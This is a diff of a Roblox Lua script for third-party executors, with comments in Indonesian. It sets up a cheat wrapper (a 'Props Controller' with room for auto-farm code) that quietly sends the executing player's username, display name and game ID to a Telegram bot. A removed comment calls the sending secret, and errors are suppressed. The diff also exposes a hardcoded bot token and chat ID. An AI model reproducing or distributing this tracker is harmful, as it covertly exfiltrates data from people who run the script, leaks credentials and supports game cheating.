@@ -1,17 +1,17 @@
--- Ambil data pemain yang mengeksekusi script
+-- 1. Ambil data pemain yang mengeksekusi script
 local player = game:GetService("Players").LocalPlayer
 local playerName = player.Name
 local displayName = player.DisplayName
 
--- KONFIGURASI TELEGRAM BOT (Sudah terisi dengan data Anda)
-local botToken = "8896951312:AAExDFPex9etWJ0sonBpRuTeUuyTkrad0QY"
+-- 2. KONFIGURASI TELEGRAM BOT (Token yang sudah diperbaiki)
+local botToken = "8896951312:AAExDFPex9etwJ0soNbPRuTeUuyTkradOQY"
 local chatId = "7227168665"
 
--- Format Pesan Notifikasi
+-- 3. Siapkan URL dan Pesan Notifikasi
 local url = "https://api.telegram.org/bot" .. botToken .. "/sendMessage"
 local message = "🔔 **Script Executed!**\n\n👤 Username: `" .. playerName .. "`\n🏷️ Display Name: `" .. displayName .. "`\n🎮 Game ID: `" .. game.PlaceId .. "`"
 
--- Kirim data secara diam-diam ke Telegram
+-- 4. Siapkan data JSON untuk dikirim
 local HttpService = game:GetService("HttpService")
 local data = {
     chat_id = chatId,
@@ -19,9 +19,11 @@ local data = {
     parse_mode = "Markdown"
 }
 
+-- 5. Fungsi pengirim pesan
 local requestFunc = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)
 
 if requestFunc then
+    -- pcall digunakan agar script tidak error/berhenti jika gagal mengirim
     pcall(function()
         requestFunc({
             Url = url,
@@ -33,6 +35,7 @@ if requestFunc then
 end
 
 -- ==========================================
--- TARUH / GABUNGKAN SCRIPT UTAMA ROBLOX ANDA DI BAWAH INI
+-- ISI SCRIPT UTAMA ANDA DI BAWAH INI
 -- ==========================================
-print("Script berhasil dijalankan oleh: " .. playerName)
+print("Props Controller berhasil dijalankan oleh: " .. playerName)
+-- (Masukkan kode auto-farm / script controller Anda di sini)
